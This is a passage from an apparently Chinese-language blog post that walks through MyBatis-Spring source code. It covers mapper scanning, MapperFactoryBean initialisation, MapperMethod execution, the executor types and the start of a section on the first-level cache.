class="keyword">if</span> (<span class="keyword">this</span>.processPropertyPlaceHolders) &#123;</span><br><span class="line">    processPropertyPlaceHolders();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  ClassPathMapperScanner scanner = <span class="keyword">new</span> ClassPathMapperScanner(registry);</span><br><span class="line">  scanner.setAddToConfig(<span class="keyword">this</span>.addToConfig);</span><br><span class="line">  scanner.setAnnotationClass(<span class="keyword">this</span>.annotationClass);</span><br><span class="line">  scanner.setMarkerInterface(<span class="keyword">this</span>.markerInterface);</span><br><span class="line">  scanner.setSqlSessionFactory(<span class="keyword">this</span>.sqlSessionFactory);</span><br><span class="line">  scanner.setSqlSessionTemplate(<span class="keyword">this</span>.sqlSessionTemplate);</span><br><span class="line">  scanner.setSqlSessionFactoryBeanName(<span class="keyword">this</span>.sqlSessionFactoryBeanName);</span><br><span class="line">  scanner.setSqlSessionTemplateBeanName(<span class="keyword">this</span>.sqlSessionTemplateBeanName);</span><br><span class="line">  scanner.setResourceLoader(<span class="keyword">this</span>.applicationContext);</span><br><span class="line">  scanner.setBeanNameGenerator(<span class="keyword">this</span>.nameGenerator);</span><br><span class="line">  scanner.setMapperFactoryBeanClass(<span class="keyword">this</span>.mapperFactoryBeanClass);</span><br><span class="line">  <span class="keyword">if</span> (StringUtils.hasText(lazyInitialization)) &#123;</span><br><span class="line">    scanner.setLazyInitialization(Boolean.valueOf(lazyInitialization));</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (StringUtils.hasText(defaultScope)) &#123;</span><br><span class="line">    scanner.setDefaultScope(defaultScope);</span><br><span class="line">  &#125;</span><br><span class="line">  scanner.registerFilters();</span><br><span class="line">  scanner.scan(</span><br><span class="line">      StringUtils.tokenizeToStringArray(<span class="keyword">this</span>.basePackage, ConfigurableApplicationContext.CONFIG_LOCATION_DELIMITERS));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>scan方法最后会调用doScan方法，而ClassPathMapperScanner对ClassPathBeanDefinitionScanner的doScan方法进行了重写。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> Set&lt;BeanDefinitionHolder&gt; <span class="title">doScan</span><span class="params">(String... basePackages)</span> </span>&#123;</span><br><span class="line">  Set&lt;BeanDefinitionHolder&gt; beanDefinitions = <span class="keyword">super</span>.doScan(basePackages);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (beanDefinitions.isEmpty()) &#123;</span><br><span class="line">    <span class="keyword">if</span> (printWarnLogIfNotFoundMappers) &#123;</span><br><span class="line">      LOGGER.warn(() -&gt; <span class="string">&quot;No MyBatis mapper was found in &#x27;&quot;</span> + Arrays.toString(basePackages)</span><br><span class="line">          + <span class="string">&quot;&#x27; package. Please check your configuration.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    processBeanDefinitions(beanDefinitions);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> beanDefinitions;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>doScan方法里面的processBeanDefinitions(beanDefinitions) 主要对basePackages下面扫描出来的beanDefinition进行了重新定义，最主要的是definition.setBeanClass(this.mapperFactoryBeanClass)，将bean的class设置为MapperFactoryBean.class，将bean之前的className放入mapperInterface这个参数里面，MapperFactoryBean继承了SqlSessionDaoSupport方法，并实现了FactoryBean接口。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> Set&lt;BeanDefinitionHolder&gt; <span class="title">doScan</span><span class="params">(String... basePackages)</span> </span>&#123;</span><br><span class="line">  Set&lt;BeanDefinitionHolder&gt; beanDefinitions = <span class="keyword">super</span>.doScan(basePackages);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (beanDefinitions.isEmpty()) &#123;</span><br><span class="line">    <span class="keyword">if</span> (printWarnLogIfNotFoundMappers) &#123;</span><br><span class="line">      LOGGER.warn(() -&gt; <span class="string">&quot;No MyBatis mapper was found in &#x27;&quot;</span> + Arrays.toString(basePackages)</span><br><span class="line">          + <span class="string">&quot;&#x27; package. Please check your configuration.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    processBeanDefinitions(beanDefinitions);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> beanDefinitions;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">processBeanDefinitions</span><span class="params">(Set&lt;BeanDefinitionHolder&gt; beanDefinitions)</span> </span>&#123;</span><br><span class="line">  AbstractBeanDefinition definition;</span><br><span class="line">  BeanDefinitionRegistry registry = getRegistry();</span><br><span class="line">  <span class="keyword">for</span> (BeanDefinitionHolder holder : beanDefinitions) &#123;</span><br><span class="line">    definition = (AbstractBeanDefinition) holder.getBeanDefinition();</span><br><span class="line">    <span class="keyword">boolean</span> scopedProxy = <span class="keyword">false</span>;</span><br><span class="line">    <span class="keyword">if</span> (ScopedProxyFactoryBean.class.getName().equals(definition.getBeanClassName())) &#123;</span><br><span class="line">      definition = (AbstractBeanDefinition) Optional</span><br><span class="line">          .ofNullable(((RootBeanDefinition) definition).getDecoratedDefinition())</span><br><span class="line">          .map(BeanDefinitionHolder::getBeanDefinition).orElseThrow(() -&gt; <span class="keyword">new</span> IllegalStateException(</span><br><span class="line">              <span class="string">&quot;The target bean definition of scoped proxy bean not found. Root bean definition[&quot;</span> + holder + <span class="string">&quot;]&quot;</span>));</span><br><span class="line">      scopedProxy = <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    String beanClassName = definition.getBeanClassName();</span><br><span class="line">    LOGGER.debug(() -&gt; <span class="string">&quot;Creating MapperFactoryBean with name &#x27;&quot;</span> + holder.getBeanName() + <span class="string">&quot;&#x27; and &#x27;&quot;</span> + beanClassName</span><br><span class="line">        + <span class="string">&quot;&#x27; mapperInterface&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// the mapper interface is the original class of the bean</span></span><br><span class="line">    <span class="comment">// but, the actual class of the bean is MapperFactoryBean</span></span><br><span class="line">    definition.getConstructorArgumentValues().addGenericArgumentValue(beanClassName); <span class="comment">// issue #59</span></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      Class&lt;?&gt; beanClass = Resources.classForName(beanClassName);</span><br><span class="line">      <span class="comment">// Attribute for MockitoPostProcessor</span></span><br><span class="line">      <span class="comment">// https://github.com/mybatis/spring-boot-starter/issues/475</span></span><br><span class="line">      definition.setAttribute(FACTORY_BEAN_OBJECT_TYPE, beanClass);</span><br><span class="line">      <span class="comment">// for spring-native</span></span><br><span class="line">      definition.getPropertyValues().add(<span class="string">&quot;mapperInterface&quot;</span>, beanClass);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (ClassNotFoundException ignore) &#123;</span><br><span class="line">      <span class="comment">// ignore</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    definition.setBeanClass(<span class="keyword">this</span>.mapperFactoryBeanClass);</span><br><span class="line"></span><br><span class="line">    definition.getPropertyValues().add(<span class="string">&quot;addToConfig&quot;</span>, <span class="keyword">this</span>.addToConfig);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">boolean</span> explicitFactoryUsed = <span class="keyword">false</span>;</span><br><span class="line">    <span class="keyword">if</span> (StringUtils.hasText(<span class="keyword">this</span>.sqlSessionFactoryBeanName)) &#123;</span><br><span class="line">      definition.getPropertyValues().add(<span class="string">&quot;sqlSessionFactory&quot;</span>,</span><br><span class="line">          <span class="keyword">new</span> RuntimeBeanReference(<span class="keyword">this</span>.sqlSessionFactoryBeanName));</span><br><span class="line">      explicitFactoryUsed = <span class="keyword">true</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">this</span>.sqlSessionFactory != <span class="keyword">null</span>) &#123;</span><br><span class="line">      definition.getPropertyValues().add(<span class="string">&quot;sqlSessionFactory&quot;</span>, <span class="keyword">this</span>.sqlSessionFactory);</span><br><span class="line">      explicitFactoryUsed = <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (StringUtils.hasText(<span class="keyword">this</span>.sqlSessionTemplateBeanName)) &#123;</span><br><span class="line">      <span class="keyword">if</span> (explicitFactoryUsed) &#123;</span><br><span class="line">        LOGGER.warn(</span><br><span class="line">            () -&gt; <span class="string">&quot;Cannot use both: sqlSessionTemplate and sqlSessionFactory together. sqlSessionFactory is ignored.&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      definition.getPropertyValues().add(<span class="string">&quot;sqlSessionTemplate&quot;</span>,</span><br><span class="line">          <span class="keyword">new</span> RuntimeBeanReference(<span class="keyword">this</span>.sqlSessionTemplateBeanName));</span><br><span class="line">      explicitFactoryUsed = <span class="keyword">true</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">this</span>.sqlSessionTemplate != <span class="keyword">null</span>) &#123;</span><br><span class="line">      <span class="keyword">if</span> (explicitFactoryUsed) &#123;</span><br><span class="line">        LOGGER.warn(</span><br><span class="line">            () -&gt; <span class="string">&quot;Cannot use both: sqlSessionTemplate and sqlSessionFactory together. sqlSessionFactory is ignored.&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      definition.getPropertyValues().add(<span class="string">&quot;sqlSessionTemplate&quot;</span>, <span class="keyword">this</span>.sqlSessionTemplate);</span><br><span class="line">      explicitFactoryUsed = <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!explicitFactoryUsed) &#123;</span><br><span class="line">      LOGGER.debug(() -&gt; <span class="string">&quot;Enabling autowire by type for MapperFactoryBean with name &#x27;&quot;</span> + holder.getBeanName() + <span class="string">&quot;&#x27;.&quot;</span>);</span><br><span class="line">      definition.setAutowireMode(AbstractBeanDefinition.AUTOWIRE_BY_TYPE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    definition.setLazyInit(lazyInitialization);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (scopedProxy) &#123;</span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (ConfigurableBeanFactory.SCOPE_SINGLETON.equals(definition.getScope()) &amp;&amp; defaultScope != <span class="keyword">null</span>) &#123;</span><br><span class="line">      definition.setScope(defaultScope);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!definition.isSingleton()) &#123;</span><br><span class="line">      BeanDefinitionHolder proxyHolder = ScopedProxyUtils.createScopedProxy(holder, registry, <span class="keyword">true</span>);</span><br><span class="line">      <span class="keyword">if</span> (registry.containsBeanDefinition(proxyHolder.getBeanName())) &#123;</span><br><span class="line">        registry.removeBeanDefinition(proxyHolder.getBeanName());</span><br><span class="line">      &#125;</span><br><span class="line">      registry.registerBeanDefinition(proxyHolder.getBeanName(), proxyHolder.getBeanDefinition());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="MapperFactoryBean"><a href="#MapperFactoryBean" class="headerlink" title="MapperFactoryBean"></a>MapperFactoryBean</h4><p>MapperFactoryBean继承SqlSessionDaoSupport继承DaoSupport实现了InitializingBean接口，所以bean初始化的时候afterPropertiesSet会被执行，会去执行checkDaoConfig()方法。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title">afterPropertiesSet</span><span class="params">()</span> <span class="keyword">throws</span> IllegalArgumentException, BeanInitializationException </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.checkDaoConfig();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">this</span>.initDao();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception var2) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> BeanInitializationException(<span class="string">&quot;Initialization of DAO failed&quot;</span>, var2);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>让我们一起看看checkDaoConfig方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">checkDaoConfig</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">super</span>.checkDaoConfig();</span><br><span class="line"></span><br><span class="line">  notNull(<span class="keyword">this</span>.mapperInterface, <span class="string">&quot;Property &#x27;mapperInterface&#x27; is required&quot;</span>);</span><br><span class="line"></span><br><span class="line">  Configuration configuration = getSqlSession().getConfiguration();</span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">this</span>.addToConfig &amp;&amp; !configuration.hasMapper(<span class="keyword">this</span>.mapperInterface)) &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      configuration.addMapper(<span class="keyword">this</span>.mapperInterface);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">      logger.error(<span class="string">&quot;Error while adding the mapper &#x27;&quot;</span> + <span class="keyword">this</span>.mapperInterface + <span class="string">&quot;&#x27; to configuration.&quot;</span>, e);</span><br><span class="line">      <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(e);</span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">      ErrorContext.instance().reset();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个方法会将这个mapperInterface放入configuration里面，主要的是configuration.addMapper(this.mapperInterface);方法，里面调用了mapperRegistry.addMapper()方法，这个方法new了一个MapperProxyFactory代理工厂类放到了knownMappers这个Concur</p><p>rentHashMap里面用来后面获取，然后会声明一个MapperAnnotationBuilder对我们的mapper对象和xml文件进行解析。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> &lt;T&gt; <span class="function"><span class="keyword">void</span> <span class="title">addMapper</span><span class="params">(Class&lt;T&gt; type)</span> </span>&#123;</span><br><span class="line">      <span class="keyword">if</span> (type.isInterface()) &#123;</span><br><span class="line">          <span class="keyword">if</span> (<span class="keyword">this</span>.hasMapper(type)) &#123;</span><br><span class="line">              <span class="keyword">throw</span> <span class="keyword">new</span> BindingException(<span class="string">&quot;Type &quot;</span> + type + <span class="string">&quot; is already known to the MapperRegistry.&quot;</span>);</span><br><span class="line">          &#125;</span><br><span class="line"></span><br><span class="line">          <span class="keyword">boolean</span> loadCompleted = <span class="keyword">false</span>;</span><br><span class="line"></span><br><span class="line">          <span class="keyword">try</span> &#123;</span><br><span class="line">              <span class="keyword">this</span>.knownMappers.put(type, <span class="keyword">new</span> MapperProxyFactory(type));</span><br><span class="line">              MapperAnnotationBuilder parser = <span class="keyword">new</span> MapperAnnotationBuilder(<span class="keyword">this</span>.config, type);</span><br><span class="line">              parser.parse();</span><br><span class="line">              loadCompleted = <span class="keyword">true</span>;</span><br><span class="line">          &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">              <span class="keyword">if</span> (!loadCompleted) &#123;</span><br><span class="line">                  <span class="keyword">this</span>.knownMappers.remove(type);</span><br><span class="line">              &#125;</span><br><span class="line"></span><br><span class="line">          &#125;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>以下是对于FactoryBean接口的实现</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"> </span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"> <span class="function"><span class="keyword">public</span> T <span class="title">getObject</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">   <span class="keyword">return</span> getSqlSession().getMapper(<span class="keyword">this</span>.mapperInterface);</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> <span class="comment">/**</span></span><br><span class="line"><span class="comment">  * &#123;<span class="doctag">@inheritDoc</span>&#125;</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"> <span class="meta">@Override</span></span><br><span class="line"> <span class="function"><span class="keyword">public</span> Class&lt;T&gt; <span class="title">getObjectType</span><span class="params">()</span> </span>&#123;</span><br><span class="line">   <span class="keyword">return</span> <span class="keyword">this</span>.mapperInterface;</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> <span class="comment">/**</span></span><br><span class="line"><span class="comment">  * &#123;<span class="doctag">@inheritDoc</span>&#125;</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"> <span class="meta">@Override</span></span><br><span class="line"> <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isSingleton</span><span class="params">()</span> </span>&#123;</span><br><span class="line">   <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>里面的getObject方法会去前面说的knownMappers获取MapperProxyFactory对象，这个对象又会返回一个MapperProxy对象，这个MapperProxy实现了InvocationHandler代理，最后调用了MapperMethod的execute(SqlSession sqlSession, Object[] args)方法。</p><h4 id="MapperMethod"><a href="#MapperMethod" class="headerlink" title="MapperMethod"></a>MapperMethod</h4><p>MapperMethod的构造器只有一个，里面new了两个对象，其中SqlCommand主要获取name和type，MethodSignature主要对接口的参数和返回值进行解析。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">MapperMethod</span><span class="params">(Class&lt;?&gt; mapperInterface, Method method, Configuration config)</span> </span>&#123;</span><br><span class="line">   <span class="keyword">this</span>.command = <span class="keyword">new</span> SqlCommand(config, mapperInterface, method);</span><br><span class="line">   <span class="keyword">this</span>.method = <span class="keyword">new</span> MethodSignature(config, mapperInterface, method);</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>看一下execute方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">execute</span><span class="params">(SqlSession sqlSession, Object[] args)</span> </span>&#123;</span><br><span class="line">  Object result;</span><br><span class="line">  <span class="keyword">switch</span> (command.getType()) &#123;</span><br><span class="line">    <span class="keyword">case</span> INSERT: &#123;</span><br><span class="line">      Object param = method.convertArgsToSqlCommandParam(args);</span><br><span class="line">      result = rowCountResult(sqlSession.insert(command.getName(), param));</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">case</span> UPDATE: &#123;</span><br><span class="line">      Object param = method.convertArgsToSqlCommandParam(args);</span><br><span class="line">      result = rowCountResult(sqlSession.update(command.getName(), param));</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">case</span> DELETE: &#123;</span><br><span class="line">      Object param = method.convertArgsToSqlCommandParam(args);</span><br><span class="line">      result = rowCountResult(sqlSession.delete(command.getName(), param));</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">case</span> SELECT:</span><br><span class="line">      <span class="keyword">if</span> (method.returnsVoid() &amp;&amp; method.hasResultHandler()) &#123;</span><br><span class="line">        executeWithResultHandler(sqlSession, args);</span><br><span class="line">        result = <span class="keyword">null</span>;</span><br><span class="line">      &#125; <span class="keyword">else</span> <span class="keyword">if</span> (method.returnsMany()) &#123;</span><br><span class="line">        result = executeForMany(sqlSession, args);</span><br><span class="line">      &#125; <span class="keyword">else</span> <span class="keyword">if</span> (method.returnsMap()) &#123;</span><br><span class="line">        result = executeForMap(sqlSession, args);</span><br><span class="line">      &#125; <span class="keyword">else</span> <span class="keyword">if</span> (method.returnsCursor()) &#123;</span><br><span class="line">        result = executeForCursor(sqlSession, args);</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        Object param = method.convertArgsToSqlCommandParam(args);</span><br><span class="line">        result = sqlSession.selectOne(command.getName(), param);</span><br><span class="line">        <span class="keyword">if</span> (method.returnsOptional() &amp;&amp; (result == <span class="keyword">null</span> || !method.getReturnType().equals(result.getClass()))) &#123;</span><br><span class="line">          result = Optional.ofNullable(result);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> FLUSH:</span><br><span class="line">      result = sqlSession.flushStatements();</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">      <span class="keyword">throw</span> <span class="keyword">new</span> BindingException(<span class="string">&quot;Unknown execution method for: &quot;</span> + command.getName());</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (result == <span class="keyword">null</span> &amp;&amp; method.getReturnType().isPrimitive() &amp;&amp; !method.returnsVoid()) &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> BindingException(<span class="string">&quot;Mapper method &#x27;&quot;</span> + command.getName()</span><br><span class="line">        + <span class="string">&quot;&#x27; attempted to return null from a method with a primitive return type (&quot;</span> + method.getReturnType() + <span class="string">&quot;).&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>主要是通过刚才获取到的type，使用sqlSession进行不同的逻辑处理，后面的逻辑是通过configuration根据statementId获取到对应的MappedStatement，然后调用不同的Executor来执行，Executor最后会生成StatementHandler来处理传进来的MappedStatement，parameter等参数，最终去执行sql，并将结果交给ResultHandler，ResultHandler对获取到的结果进行处理，至此一套mybatis的流程就到此为止了。</p><p>接下来我们看看里面的一些细节。</p><h3 id="Executor"><a href="#Executor" class="headerlink" title="Executor"></a>Executor</h3><div class="tag-plugin image"><div class="image-bg"><img src="/2023/10/20/mybatis/image-20240305155512827.png"></div></div><p><strong>SimpleExecutor</strong>：每执行一次update或select，就开启一个Statement对象，用完立刻关闭Statement对象。<br><strong>ReuseExecutor</strong>：执行update或select，以sql作为key查找Statement对象，存在就使用，不存在就创建，用完后，不关闭Statement对象，而是放置于Map内，供下一次使用。简言之，就是重复使用Statement对象。<br><strong>BatchExecutor</strong>：执行update（没有select，JDBC批处理不支持select），将所有sql都添加到批处理中（addBatch()），等待统一执行（executeBatch()），它缓存了多个Statement对象，每个Statement对象都是addBatch()完毕后，等待逐一执行executeBatch()批处理。与JDBC批处理相同。</p><p><strong>CachingExecutor</strong>：CachingExecutor是一个Executor接口的装饰器，它为Executor对象增加了二级缓存的相关功能，委托的执行器对象可以是SimpleExecutor、ReuseExecutor、BatchExecutor中任一一个。执行 update 方法前判断是否清空二级缓存；执行 query 方法前先在二级缓存中查询，命中失败再通过被代理类查询。</p><h3 id="缓存"><a href="#缓存" class="headerlink" title="缓存"></a>缓存</h3><h4 id="一级缓存"><a href="#一级缓存" class="headerlink" title="一级缓存"></a>一级缓存</h4><p>首先一级缓存的作用域是一个sqlSession里面，sqlSession会使用Executor来做数据库的一些操作，而一级缓存就是抽象类BaseExecutor的一个成员变量，取名交作localCache。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> PerpetualCache localCache;</span><br></pre></td></tr></table></figure><p>看一下PerpetualCache的变量，会发现里面是用HashMap来做的缓存。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">final</span> String id;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">final</span> Map&lt;Object, Object&gt; cache = <span class="keyword">new</span> 